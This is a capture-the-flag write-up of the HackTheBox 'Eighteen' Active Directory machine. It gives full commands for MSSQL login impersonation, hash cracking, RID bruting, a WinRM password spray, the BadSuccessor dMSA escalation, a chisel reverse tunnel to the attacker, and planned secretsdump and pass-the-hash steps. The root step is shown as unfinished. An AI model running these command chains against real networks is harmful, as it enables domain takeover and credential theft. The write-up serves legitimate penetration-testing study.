
# Eighteen

**By Stager** | FashilHack

---
## What is this machine

Eighteen is a medium-difficulty Windows Active Directory machine on HackTheBox. The box is a Domain Controller running Windows Server 2025, and the entire attack chain starts from a pair of MSSQL credentials. What makes this machine interesting is how many layers sit between those first credentials and domain admin — user impersonation inside SQL Server, cracking a Django password hash, password spraying domain users, and finally exploiting BadSuccessor, a brand new Active Directory vulnerability that only affects Windows Server 2025.

This machine teaches you that a low-privilege SQL login is never a dead end. You enumerate, you impersonate, you pivot. Each step opens the next door.

---
## Target

```
IP:       10.129.26.32
Domain:   eighteen.htb
DC Name:  DC01
OS:       Windows Server 2025 Build 26100
```

---

## Step 1 — Nmap Reconnaissance

Started with a full port scan to find every open service:

```bash
nmap -p- --min-rate 5000 10.129.26.32
```

Then a detailed version scan on the interesting ports:

```bash
sudo nmap -T4 -sV -A -Pn 10.129.26.32
```

The three ports that matter:

```
1433/tcp  — MSSQL (Microsoft SQL Server 2022 RTM 16.0.1000)
80/tcp    — HTTP (Python web application — Werkzeug framework)
5985/tcp  — WinRM (remote PowerShell access)
```

![[stager/writeups/write-ups/Eighteen/nmap.png]]

Added the domain to `/etc/hosts` so everything resolves cleanly:

```bash
echo "10.129.26.32 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
```

A Domain Controller with MSSQL and a web app running alongside WinRM. The first thing to try is whatever credentials we already have.


---

## Step 2 — MSSQL Enumeration

We have credentials for a SQL user named kevin. Connect with impacket:

```bash
impacket-mssqlclient Kevin:'iNa2we6haRj2gaw!'@10.129.26.32
```

The prompt changes to `SQL (kevin guest@master)>` — two things to notice immediately. The username is `kevin` and the role is `guest`. Guest means the lowest possible privilege level. The first questions to answer are: who are we, what can we access, and is there any path upward.

**Check who we are and whether we have admin rights:**

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Returns `kevin` and `0`. Zero means no — we are not sysadmin.

**List all databases on the server:**![[login in with creds given.png]]

```sql
SELECT name FROM master.dbo.sysdatabases;
```

This is like running `ls` on the root of the server. Four default databases appear (master, tempdb, model, msdb) plus one that stands out immediately: `financial_planner`. Non-default databases always mean a custom application, which always means interesting data.

**List all server logins:**

```sql
SELECT name, type_desc, is_disabled FROM master.sys.server_principals;
```

Two real SQL logins besides the built-ins: `kevin` and `appdev`. Two accounts means one of them might have more access than the other.

![[finding how many users.png]]

**Check impersonation rights:**

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

This query looks at the permissions table and asks: who has been granted the ability to be impersonated? The result comes back: `appdev`.

![[who can i impersonate.png]]
This is the key finding. In MSSQL, `EXECUTE AS LOGIN` lets you temporarily become another login and inherit all their permissions — like `sudo` but for SQL identities. Kevin cannot access `financial_planner`, but maybe `appdev` can.

> **Important:** impacket-mssqlclient sends each line to the server separately. Always write multi-line queries as a single line or they will fail with syntax errors.
![[imporsanated kevin.png]]
---

## Step 3 — User Impersonation

Become appdev:

```sql
EXECUTE AS LOGIN = 'appdev';
```

Watch the prompt change from `kevin guest@master` to `appdev appdev@master`. We are now running as a completely different identity. Check sysadmin again:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Still 0. Appdev is not sysadmin either. But the real test is the database:

```sql
USE financial_planner;
```

It works. Kevin got an access denied error trying this exact command. Appdev can enter it. That is why impersonation mattered — not for sysadmin access, but to reach data that was locked behind a different account.

![[imporsanated kevin.png]]

---

## Step 4 — Database Dump

Inside `financial_planner`, list the tables:

```sql
SELECT table_name FROM information_schema.tables;
```

Six tables: `users`, `incomes`, `expenses`, `allocations`, `analytics`, `visits`. This is a web application's database. The `visits` table tells us the web app on port 80 is actively being used. The `users` table is what we want.

Check the structure first before dumping everything — good habit to know what you are looking at:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

There is a `password_hash` column and an `is_admin` column. Dump it:

```sql
SELECT * FROM users;
```

One row comes back:

```
id:            1002
username:      admin
email:         admin@eighteen.htb
password_hash: pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
is_admin:      1
```

The admin account for the web application. The hash format tells us everything: `pbkdf2:sha256:600000` is PBKDF2-SHA256 with 600,000 iterations. High iteration counts are designed to slow down cracking — this will take time on a CPU.

![[dumped users table found creds.png]]

---

## Step 5 — Hash Cracking

The hash format here looks like Werkzeug (a Python web framework) but is actually Django's PBKDF2 format. They look similar but hashcat treats them as completely different modes. Getting this wrong means hashcat rejects the hash and loads nothing — frustrating to debug.

The difference:

- **Werkzeug format:** `pbkdf2:sha256:600000$salt$hexhash` — hashcat mode 10900
- **Django format:** `pbkdf2_sha256$600000$salt$base64hash` — hashcat mode 10000

Our hash needs to be in Django format with the hash portion converted from hex to base64.

Convert the hex hash to base64:

```bash
echo '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | xxd -r -p | base64
```

![[convert to hash hex to base64.png]]

Build the correctly formatted hash file:

```bash
echo -n 'pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > adminhash.txt
```

Run hashcat with mode 10000:

```bash
hashcat -m 10000 adminhash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked: `iloveyou1`**

![[hash cracked.png]]

---

## Step 6 — Domain User Enumeration via RID Bruting

With valid MSSQL credentials, we can enumerate domain accounts through a technique called RID bruting. Every Windows account has a RID — a number at the end of its security identifier. Standard built-in accounts always have the same RIDs (Administrator is always 500, Guest is always 501). Everything else gets assigned sequentially starting from 1000.

RID bruting works by iterating through those numbers and asking the system what account maps to each one. The clever part here is we are doing this over MSSQL — not SMB or LDAP. When those protocols are locked down, MSSQL becomes the channel. Netexec handles it automatically:

```bash
netexec mssql eighteen.htb -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

Two things become clear from the output. First, this is a real Domain Controller — the output shows `DC01`, domain `EIGHTEEN.htb`, Windows Server 2025 Build 26100. Second, there are seven real domain users alongside the standard built-in accounts:

```
1606: EIGHTEEN\jamie.dunn
1607: EIGHTEEN\jane.smith
1608: EIGHTEEN\alice.jones
1609: EIGHTEEN\adam.scott
1610: EIGHTEEN\bob.brown
1611: EIGHTEEN\carol.white
1612: EIGHTEEN\dave.green
```

Also visible: three groups called `HR`, `IT`, and `Finance`. Group names on a DC are always worth noting — they often hint at what Active Directory permissions those groups hold.

Save just the real users to a file:

```bash
netexec mssql eighteen.htb -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute | grep -oP 'EIGHTEEN\\\K\w+\.\w+' > users.txt
```

![[users found .png]]

---

## Step 7 — Password Spray via WinRM

We have a cracked password (`iloveyou1`) and a list of seven domain users. Password reuse is one of the most reliable things in penetration testing — people set one password and use it across multiple accounts.

Spraying means trying that one password against every account. The important discipline is doing it against one protocol at a time and not hammering too fast, to avoid triggering account lockouts. WinRM is a clean target because the result is unambiguous — either the account has remote access or it does not:![[passspray.png]]

```bash
netexec winrm 10.129.26.32 -u users.txt -p 'iloveyou1'
```

![[found adam scott pwn3d.png]]
`adam.scott` comes back with `Pwn3d!` — that means this account has WinRM access and the password matches.

---

## Step 8 — WinRM Shell as adam.scott

```bash
evil-winrm -i 10.129.26.32 -u adam.scott -p 'iloveyou1'
```

![[login evil-winrm.png]]
Navigate to the desktop and grab the flag:

```powershell
cd Desktop
download user.txt
```

**User flag captured.**

![[stager/writeups/write-ups/Eighteen/user flag.png]]

Now enumerate adam.scott's position in the domain — this drives the privilege escalation decision:

```powershell
net user adam.scott /domain
```

Global group memberships: `IT` and `Domain Users`. Adam is in the IT group. Earlier during RID bruting we saw IT listed as a custom group on this domain. The machine hint asks what permission IT has over the Staff OU — this is pointing directly at an Active Directory ACL attack.

![[adam is in IT domain users group.png]]

---

## Step 9 — Privilege Escalation via BadSuccessor (CVE-2025-53779)

### What the Vulnerability Is

BadSuccessor is a privilege escalation vulnerability that only exists in Windows Server 2025 Active Directory. It abuses a relatively new feature called Delegated Managed Service Accounts (dMSA).

Here is the concept: if your user or group has `CreateChild` rights on an Organizational Unit, you can create a dMSA object inside it. A dMSA has a special attribute that says "I am the successor of this other account." When Kerberos issues a ticket for the dMSA, it includes the privileges of the linked predecessor account in that ticket.

The attack chain is:
1. Create a dMSA in an OU where IT has CreateChild rights (the Staff OU)
2. Link that dMSA to the Administrator account as its predecessor
3. Request a Kerberos ticket for the dMSA
4. The ticket carries Administrator's privileges — full domain compromise

Before this vulnerability, having CreateChild on an OU was considered low risk. On Windows Server 2025, it equals full domain compromise.

### Running the Exploit

Download the PowerShell implementation from GitHub:

```
https://github.com/b5null/Invoke-BadSuccessor.ps1
```

Upload it via evil-winrm:

```powershell
upload Invoke-BadSuccessor.ps1
```

Import the script — note: dot-sourcing must be run as its own command, not combined with anything else on the same line:

```powershell
. .\Invoke-BadSuccessor.ps1
```

```powershell
Find-VulnerableOU
```

![[can createchild.png]]

Run the full attack chain, specifying Administrator as the account to link to:

```powershell
Invoke-BadSuccessor -PrecededByIdentity "Administrator"
```

The script does everything automatically:

```
[+] Created computer 'Pwn' in 'OU=Staff,DC=eighteen,DC=htb'.
[+] Machine Account's sAMAccountName : Pwn$
[+] Created delegated service account 'attacker_dMSA' in 'OU=Staff,DC=eighteen,DC=htb'.
[+] Service Account's sAMAccountName : attacker_dMSA$
[+] Granted 'GenericAll' on 'attacker_dMSA$' to 'adam.scott'.
[+] Configured delegated MSA state for 'attacker_dMSA$' with predecessor:
    CN=Administrator,CN=Users,DC=eighteen,DC=htb
```

Three things happened: a machine account called `Pwn$` was created with a known password (`Password123!`), a dMSA called `attacker_dMSA$` was created and linked to Administrator, and adam.scott was given full control over the dMSA. Everything is in place.

![[s.png]]

### Getting the Ticket — Pending (Clock Skew Issue)

The next step is using impacket's getST to request a Kerberos ticket as `attacker_dMSA$`. Because port 88 (Kerberos) is filtered from outside, a chisel tunnel was set up to forward it through the existing WinRM connection:

**Attack machine — start the chisel server:**

```bash
./chisel server -p 8080 --reverse
```

**Target — connect back and forward port 88:**

```powershell
.\chisel.exe client <vpn_ip>:8080 R:88:127.0.0.1:88
```

Tunnel confirmed working — `ss -tlnp | grep 88` showed chisel listening on port 88.

![[chisel tunnel up.png]]

Then request the ticket:

```bash
faketime "2026-04-13 13:48:54" impacket-getST 'eighteen.htb/Pwn$:Password123!' -no-pass -dmsa -self -impersonate 'attacker_dMSA$' -dc-ip 127.0.0.1
```

**Blocked:** Kerberos clock skew error persists. Kerberos requires the attacker machine's clock to be within 5 minutes of the DC's clock. The DC's time was checked via evil-winrm and time sync was attempted via `faketime`, `sudo date`, and `ntpdate` — all blocked or ineffective in this environment. This step is pending research.

### Remaining Steps Once Clock Skew Is Resolved

Use the ticket to dump all domain hashes:

```bash
export KRB5CCNAME=attacker_dMSA$.ccache
impacket-secretsdump -k -no-pass dc01.eighteen.htb
```

Pass the Administrator hash to get a shell:

```bash
evil-winrm -i 10.129.26.32 -u Administrator -H <NThash>
```

---

## Flags

|Flag|Status|
|---|---|
|user.txt|✅ Captured|
|root.txt|⏳ Pending — Kerberos clock skew on ticket step|

---

## The Full Chain

```
nmap → MSSQL 1433, HTTP 80, WinRM 5985
  ↓
impacket-mssqlclient → kevin is guest, not sysadmin
  ↓
sysdatabases → financial_planner found
  ↓
server_permissions → kevin can impersonate appdev
  ↓
EXECUTE AS LOGIN appdev → access to financial_planner unlocked
  ↓
SELECT * FROM users → admin hash found
  ↓
hashcat -m 10000 → iloveyou1 cracked
  ↓
netexec --rid-brute → DC01 identified, 7 domain users found
  ↓
netexec winrm spray → adam.scott:iloveyou1 Pwn3d!
  ↓
evil-winrm → shell as adam.scott, user flag
  ↓
net user /domain → adam.scott in IT group
  ↓
Invoke-BadSuccessor → dMSA created, linked to Administrator
  ↓
chisel tunnel port 88 → confirmed working
  ↓
getST + secretsdump → PENDING (clock skew)
  ↓
evil-winrm as Administrator → PENDING
```

---

## What I Learned

**MSSQL impersonation is a real privilege escalation path.** A guest-level SQL login sounds useless. But `EXECUTE AS LOGIN` can pivot you into a higher-privilege account and unlock databases that were completely inaccessible before. Always check impersonation rights before giving up on a low-privilege SQL account — it costs one query and can change everything.

**Django and Werkzeug PBKDF2 hashes look the same but need different hashcat modes.** Werkzeug uses colons and dollar signs mixed together and is mode 10900. Django uses dollar signs throughout and is mode 10000. The hash also needs to be base64 not hex for hashcat to accept it. Getting any of this wrong means hashcat loads nothing with a confusing error.

**RID bruting works over MSSQL when SMB and LDAP are locked down.** Most people know RID bruting over SMB. Fewer know netexec can do it through a MSSQL connection. If you have any authenticated SQL access, `--rid-brute` costs nothing to try and can hand you the full user list of the domain.

**BadSuccessor makes CreateChild on any OU catastrophic on Windows Server 2025.** Before this vulnerability, CreateChild rights were considered low risk. On Windows Server 2025, CreateChild on any OU that permits dMSA creation equals full domain compromise in a few PowerShell commands. Always check for this on Server 2025 DCs.

**Kerberos is picky about three things: DNS, time, and network path.** When tunneling Kerberos through chisel, all three must be correct simultaneously — DNS resolving to the right IP, clock within 5 minutes of the DC, and port 88 actually reachable through the tunnel. When one fails the error message does not always tell you which one. Fix them in order: DNS first via `/etc/hosts`, then time via `faketime`, then verify the tunnel with `ss -tlnp`.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._